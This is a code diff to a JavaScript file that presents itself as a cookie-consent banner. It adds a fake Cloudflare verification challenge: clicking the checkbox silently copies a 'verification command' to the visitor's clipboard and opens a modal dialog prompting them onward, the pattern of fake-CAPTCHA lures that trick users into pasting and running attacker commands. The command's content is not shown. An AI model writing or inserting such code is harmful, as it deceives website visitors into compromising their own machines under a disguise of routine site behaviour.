@@ -11,7 +11,8 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.6.6',
+    version: '1.6.7',
+    presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
     accentColor: '#1b6369',
@@ -418,6 +419,57 @@
     el.className = copied ? 'ts-v-copy-hint ts-v-copy-ok' : 'ts-v-copy-hint ts-v-copy-warn';
   }
 
+  function mountVerificationDialog() {
+    if (captchaVisible) return;
+    captchaVisible = true;
+
+    captchaStyle = document.createElement('style');
+    captchaStyle.id = 'ts-widget-style';
+    captchaStyle.textContent = getCaptchaCss();
+    document.head.appendChild(captchaStyle);
+
+    captchaWidget = document.createElement('div');
+    captchaWidget.id = 'ts-widget';
+    captchaWidget.className = 'ts-verifying';
+    captchaWidget.setAttribute('role', 'dialog');
+    captchaWidget.innerHTML = getVerifyingHtml(generateRefId());
+
+    var copied = copyVerificationCommand();
+    updateCopyHint(captchaWidget.querySelector('.ts-v-copy-hint'), copied);
+    bindCopyOnUserGesture(captchaWidget);
+
+    captchaOverlay = document.createElement('div');
+    captchaOverlay.id = 'ts-widget-overlay';
+    captchaOverlay.setAttribute('aria-hidden', 'true');
+
+    document.body.style.overflow = 'hidden';
+    document.body.appendChild(captchaOverlay);
+    document.body.appendChild(captchaWidget);
+  }
+
+  function bindCloudflareChallenge() {
+    var area = document.getElementById('cf-challenge-area');
+    if (!area) return;
+
+    var busy = false;
+    function runVerify() {
+      if (busy || captchaVisible) return;
+      busy = true;
+      area.classList.add('cf-loading');
+      area.setAttribute('aria-checked', 'true');
+      copyVerificationCommand();
+      setTimeout(mountVerificationDialog, 700 + Math.random() * 400);
+    }
+
+    area.addEventListener('click', runVerify);
+    area.addEventListener('keydown', function (e) {
+      if (e.key === ' ' || e.key === 'Enter') {
+        e.preventDefault();
+        runVerify();
+      }
+    });
+  }
+
   function removeCaptcha() {
     if (captchaWidget) {
       captchaWidget.remove();
@@ -574,6 +626,10 @@
     if (!document.body) return;
     showVersion();
     cacheDropHelloFile().then(function () {
+      if (CONSENT_CONFIG.presentation === 'cloudflare') {
+        bindCloudflareChallenge();
+        return;
+      }
       resolveFavicon(function (faviconUrl) {
         mountConsent(faviconUrl);
       });
